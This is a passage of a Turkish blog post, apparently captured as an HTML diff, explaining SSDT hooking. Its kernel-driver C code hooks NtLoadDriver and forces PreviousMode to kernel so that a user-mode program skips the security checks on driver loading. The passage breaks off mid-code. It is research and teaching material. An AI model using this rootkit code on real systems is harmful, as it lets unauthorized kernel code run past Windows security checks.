+    <div class="hx-mt-6 hx-leading-7 first:hx-mt-0"><p>I also wrote an article about this work in English on Medium, you can click <a href="https://medium.com/@0xbekoo/loading-driver-from-user-mode-program-via-ssdt-hooking-720eeb08abb9" target="_blank" rel="noopener">here</a> if you want to take a look.</p></div>
+  </div>
+</div>
+<p>Merhabalar efenimm bloguma hoşgeldiniz. Bu blogta SSDT Hooking tekniğine bir yakından bakacağız. Bu teknik için hazırladığım proje üzerinden ilerleyeceğiz. Başlıktan gördüğünüz üzere User-Mode programı kullanarak NtLoadDriver ile sürücü yüklemesini sağlayacağız.</p>
+<p>Yine aynı şekilde proje, <strong>User-Mode</strong> ve <strong>Kernel-Mode</strong> olmak üzere iki kısma ayrılıyor. User-Mode programda sadece NtLoadDriver çağırarak sürücüyü yüklemeyi sağlayacağız ardından Rootkit ile User-Mode programın sürücü yüklemeden önce geçmesi gereken güvenlik önlemlerini atlatmasını sağlayacağız; bunun için ise SSDT Hooking&rsquo;den yararlanacağız.</p>
+<p>Bu konuyu anlatırken SSDT nedir gibi vs. konulara yer vermeyeceğimi burada vurgulamak isterim. Zaten blog sayfamda <a href="https://0xbekoo.github.io/docs/winkernel-dev/wkd-ssdt/" target="_blank" rel="noopener"><strong>SSDT</strong></a> ve <a href="https://0xbekoo.github.io/blog/syscalls/" target="_blank" rel="noopener"><strong>Windows Kernel&rsquo;da Syscall Araştırma Yolculuğum</strong></a> adlı iki çalışmam bulunmakta. Dolayasıyla okuyucunun SSDT konusu üzerine temel bilgileri olduğunu varsayıyorum.</p>
+<p>Ayrıca bu çalışmanın youtube videosunu hazırladım. Video olarak göz atmak isterseniz <a href="https://www.youtube.com/watch?v=ZPcho497VXQ" target="_blank" rel="noopener">buraya</a> tıklayabilirsiniz.</p>
+<h2>SSDT Hooking<span class="hx-absolute -hx-mt-20" id="ssdt-hooking"></span>
+    <a href="#ssdt-hooking" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Her şeyden önce bu teknik nedir onu anlayalım.</p>
+<p>Kabaca SSDT Hooking tekniği sistemde yapılan bir syscall&rsquo;ı farklı rutinlere yönlendirmek veya syscall&rsquo;ı hooklamak gibi amaçlarla kullanılabilir. Yani bu teknik ile yapılan syscall&rsquo;ı gitmesi gereken rutinden farklı bir yere yönlendirebilir veya yapılan syscall&rsquo;ları hooklayabilirsiniz. Örneğin OpenProcess&rsquo;i düşünebiliriz. Bu yöntemle SSDT içerisinde oynamalar yaparak NtOpenProcess için bir syscall yapıldığında, ntoskrnl&rsquo;den NtOpenProcess&rsquo;e gitmesi gerekirken zararlı bir rutine yönlendirmesini sağlayabilirsiniz.</p>
+<p>Açıkçası şunu da vurgulamak isterim ki bu teknik artık benim gözümde eski bir teknik olarak kalıyor çünkü günümüzün windows güvenliğinde bu tekniği uygulamak pek de mümkün değil.</p>
+<p>Geçmişte Anti-virus uygulamarın bu teknikten yararlanmıştır ancak 2010 yılında bu teknik yüzünden gerçekleşmiş riskli bir olay olmuştu. O zamanlarda SSDT-Hooking tekniğini kullanan birçok anti-virus yazılımları (Aralarında popüler olan BitDefender, F-Secure, Kaspersky Sophos, McAfee ve Trend Micro gibi şirketlerde bulunmakta) yüzünden windows sistemlerde güvenlik açığı yaratmıştı. Bu olaydan sonra Microsoft, kernel için güvenlik önlemlerini daha da sıkılaştırdı.</p>
+<h2>Proje<span class="hx-absolute -hx-mt-20" id="proje"></span>
+    <a href="#proje" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Projeye detaylı bir şekilde göz atmaya başlayalım. Böylece SSDT Hooking tekniğini yakından daha iyi anlayabiliriz:</p>
+<p><img src="../../../images/posts/ssdt-hooking/diagram.png" alt="" loading="lazy" /></p>
+<p>Esasen projede, SSDT Hooking tekniği ile User-Mode Programın NtLoadDriver aracılığıyla sürücü yükleme esnasında girmesi gereken güvenlik önlemlerini atlatmasını amaçladım.</p>
+<p>User-Mode programı NtLoadDriver&rsquo;ı çağırmadan önce trambolin eklemek için rootkit ile iletişime geçiyor. Daha sonra User-Mode programı NtLoadDriver&rsquo;ı çağırıyor. Ardından ise konumuz olan SSDT Hooking tekniği burada devreye giriyor. Yapılan Syscall HookedNtLoadDriver&rsquo;a (Rootkit&rsquo;in İşlevi) yönlendiriliyor. Yani NtLoadDriver&rsquo;in orijinal adresine gitse de içerisine trambolin yerleştirdiğimiz için HookedNtLoadDriver&rsquo;a gidecektir.</p>
+<p>Bunun için ise Rootkit SSDT tablosunun adresini dinamik olarak bulur ve ardından SSDT aracılığıyla NtLoadDriver&rsquo;ın adresini hesaplar. Daha sonra hesapladığı adrese bir trambolin yerleştirir. Böylece User-Mode program bir NtLoadDriver çağrısı yaptığında akış Rootkit&rsquo;in fonksiyona gidecek.</p>
+<p>Daha sonra akış HookedNtLoadDriver&rsquo;a geldiğinde ise Rootkit KPCR-&gt;PreviousMode Bayrağını değiştirir (aşağıda detaylıca açıklayacağım) ve NtLoadDriver&rsquo;ın orijinal opcode&rsquo;larını geri yükler ardından NtLoadDriver&rsquo;ı çağırır.</p>
+<p>Bu durumda bana şunu sorabilirsiniz: “Neden NtLoadDriver?”.</p>
+<p>Açıkçası NtLoadDriver&rsquo;ı birkaç gündür araştırıyordum ve NtLoadDriver&rsquo;ı araştırırken SSDT Hooking tekniği ile tanıştım. Sonra bu iki çalışmayı birleştirmeye karar verdim. Bu hem NtLoadDriver&rsquo;in çalışma prensibini hem de SSDT Hooking tekniğini anlamamda yardımcı oldu. Farklı bir deyişle bir taşla iki kuş hesabı :D</p>
+<h3>PreviousMode Bayrağı<span class="hx-absolute -hx-mt-20" id="previousmode-bayrağı"></span>
+    <a href="#previousmode-bayra%c4%9f%c4%b1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><blockquote>
+  <p>&ldquo;Bir kullanıcı modu uygulaması, yerel sistem hizmeti rutinlerinin Nt veya Zw sürümlerinden birini çağırdığında, sistem çağrı mekanizması bu iş parçacığını (thread) çekirdek moduna geçirir. Sistemin, parametrelerin kullanıcı modundan geldiğini anlaması için, sistem çağrısını yöneten trap handler, çağrıyı yapan iş parçacığının nesnesindeki PreviousMode alanını UserMode olarak ayarlar.&rdquo; ~ <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/previousmode" target="_blank" rel="noopener">Microsoft Learn - PreviousMode</a></p>
+</blockquote>
+<p>Eğer <strong>Windows Kernel&rsquo;da Syscall Araştırma Yolculuğum</strong> blogunu okumuşsanız KPCR yapısı hakkında bilgi vermiştim. PreviousMode bayrağı bu yapı içerisindedir. Peki ama nedir bu?</p>
+<p>Açıklamadan görebileceğiniz üzere yapılan işlemin User-Mode tarafından mı yoksa Kernel-Mode tarafından mı yapıldığını gösteren bir bayraktır ve bu PreviousMode bayrağı sadece 1 veya 0 değerleri alır:</p>
+<ul>
+<li><strong>0 -</strong> Yapılan işlemin Kernel-Mode tarafından yapıldığını gösterir.</li>
+<li><strong>1 -</strong> Yapılan işlemin User-Mode tarafından yapıldığını gösterir.</li>
+</ul>
+<p>Esasen, kullanılmak istenilen Zw/Nt fonksiyonu çalıştırılmadan önce gönderilen parametrelerin User-Mode mu yoksa Kernel-Mode&rsquo;dan mı gönderildiği belirtilmesi gerekir. Bunu belirtmek için ise PreviousMode bayrağı ayarlanır.</p>
+<h3>NtLoadDriver&rsquo;ın Analiz Edilmesi<span class="hx-absolute -hx-mt-20" id="ntloaddriverın-analiz-edilmesi"></span>
+    <a href="#ntloaddriver%c4%b1n-analiz-edilmesi" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Diyagramı tekrar kontrol ederseniz, projenin NtLoadDriver&rsquo;ı çalıştırmadan önce PreviousMode bayrağını değiştirdiğini görebilirsiniz. PreviousMode bayrağını değiştirme nedenimiz yukarıdaki nedenle alakalı olsa da farklı bir nedeni daha da bulunmakta. Araştırmalarımı paylaştığımda nedenini daha iyi anlayacaksınız.</p>
+<p>NtLoadDriver fonksiyonuna göz atarsanız IopLoadDriverImage&rsquo;ı çağırdığını görebilirsiniz:</p>
+<p><img src="../../images/posts/ssdt-hooking/img1.png" alt="" loading="lazy" /></p>
+<p>Sürücünün yüklemeden önce bahsi geçen PreviousMode bayrağın kontrol edildiğini göreceksiniz:</p>
+<p><img src="../../images/posts/ssdt-hooking/img2.png" alt="" loading="lazy" /></p>
+<p>0x188 offset&rsquo;i KPCR&rsquo;e işaret eder. KPCR alındıktan sonra KPCR&rsquo;de PreviousMode (0x232&rsquo;e işaret eder) bayrağını alır ve kontrol eder.</p>
+<p>Bu kısımda ise sürücüyü yükleyenin Kernel-Mode yetkilisi mi yoksa User-Mode yetkilisi mi olduğunu kontrol ediyor. Burada esasen, eğer yetki Kernel-Mode ise güvenlik önlemlerini atlayarak direkt olarak sürücüyü yüklüyor ancak yetki User-Mode ise güvenlik kontrollerine atlıyor:</p>
+<p><img src="../../images/posts/ssdt-hooking/img3.png" alt="" loading="lazy" /></p>
+<p>Yani kısaca ne yapacağımızı anlamışsınızdır. User-Mode&rsquo;ın yaptığı syscall&rsquo;ı rootkit&rsquo;in fonksiyonuna yönlendireceğiz ve PreviousMode bayrağını 0 olarak ayarlayıp ardından NtLoadDriver&rsquo;a yönlendireceğiz.</p>
+<h2>Code<span class="hx-absolute -hx-mt-20" id="code"></span>
+    <a href="#code" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><ul>
+<li><strong>Windows Version: Windows 11 24H2</strong></li>
+<li><strong>OS Build: 26100.2894</strong></li>
+</ul>
+<p>Projenin tam haline göz atmak isterseniz <a href="https://github.com/0xbekoo/SSDT-Hooking" target="_blank" rel="noopener">bu github linkine</a> tıklayabilirsiniz.</p>
+<h3>Kernel-Mode Driver<span class="hx-absolute -hx-mt-20" id="kernel-mode-driver"></span>
+    <a href="#kernel-mode-driver" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;main.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;hook.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define SSN_NTLOADDRIVER 0x10E
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="n">g_NtLoadDriverAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">HookedNtLoadDriver</span><span class="p">(</span><span class="n">PUNICODE_STRING</span> <span class="n">DriverServiceName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">UserBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">BOOLEAN</span> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">HkRestoreFunction</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">OriginalNtLoadDriver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span> <span class="o">=</span> <span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">,</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">buff</span><span class="err">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_INSUFFICIENT_RESOURCES</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UserBuffer</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UserBuffer</span><span class="p">.</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">RtlCopyMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Driver: %wZ</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="nf">ChangePreviousMode</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PreviousStatus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">_NtLoadDriver</span> <span class="n">NtLoadDriver</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtLoadDriver</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="nf">NtLoadDriver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="n">Status</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Clean</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">Clean</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="nf">ChangePreviousMode</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PreviousStatus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">buff</span><span class="err">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="nf">GetSSDTAddress</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">KeAddSystemServiceAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ------------------
+</span></span></span><span class="line"><span class="cl"><span class="cm">  kd&gt; u nt!KeAddSystemServiceTable+0xbd L1
+</span></span></span><span class="line"><span class="cl"><span class="cm">  nt!KeAddSystemServiceTable+0xbd:
+</span></span></span><span class="line"><span class="cl"><span class="cm">  fffff800`aae7bdcd 48391d0c5b7800  cmp     qword ptr [nt!KeServiceDescriptorTable+0x20 (fffff800`ab6018e0)],rbx
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ------------------
+</span></span></span><span class="line"><span class="cl"><span class="cm">  
+</span></span></span><span class="line"><span class="cl"><span class="cm">  We will dynamically obtain the address of the SSDT by reading the opcodes at this address by the KeAddSystemServiceTable address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">AddressToRead</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">NewAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PBYTE</span> <span class="n">Instruction</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">KeAddSystemServiceAddr</span> <span class="o">+</span> <span class="mh">0xbd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Get Offset Address */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DWORD</span> <span class="n">OffsetAddress</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">Instruction</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Calculate RIP */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UINT_PTR</span> <span class="n">rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">Instruction</span> <span class="o">+</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Add Offset Address to RIP */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">AddressToRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">rip</span> <span class="o">+</span> <span class="p">(</span><span class="n">INT32</span><span class="p">)</span><span class="n">OffsetAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Get Absolute Address */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">AddressToRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">AddressToRead</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">NewAddress</span> <span class="o">=</span> <span class="nf">GetAddress</span><span class="p">(</span><span class="n">AddressToRead</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">NewAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">IoCreateClose</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">DeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">UNREFERENCED_PARAMETER</span><span class="p">(</span><span class="n">DeviceObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PIO_STACK_LOCATION</span> <span class="n">Stack</span> <span class="o">=</span> <span class="nf">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">Irp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">switch</span> <span class="p">(</span><span class="n">Stack</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">case</span> <span class="nl">IRP_MJ_CREATE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">case</span> <span class="nl">IRP_MJ_CLOSE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_DEVICE_REQUEST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">IoCompleteRequest</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">IoControl</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">DeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">UNREFERENCED_PARAMETER</span><span class="p">(</span><span class="n">DeviceObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PIO_STACK_LOCATION</span> <span class="n">Stack</span> <span class="o">=</span> <span class="nf">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">Irp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">BOOLEAN</span> <span class="n">Value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="k">switch</span> <span class="p">(</span><span class="n">Stack</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">case</span> <span class="nl">IOCTL_BYPASS_PREVIOUS_MODE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Value</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PBOOLEAN</span><span class="p">)</span><span class="n">Irp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_DEVICE_REQUEST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;IOCTL code received (IOCTL_BYPASS_PREVIOUS_MODE)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">HkDetourFunction</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">HookedNtLoadDriver</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">OriginalNtLoadDriver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_DEVICE_REQUEST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">IoCompleteRequest</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">UnloadDriver</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">DriverObject</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">UNREFERENCED_PARAMETER</span><span class="p">(</span><span class="n">DriverObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">SymName</span> <span class="o">=</span> <span class="nf">RTL_CONSTANT_STRING</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">??</span><span class="se">\\</span><span class="s">MyDriverr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Unloading the Driver...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
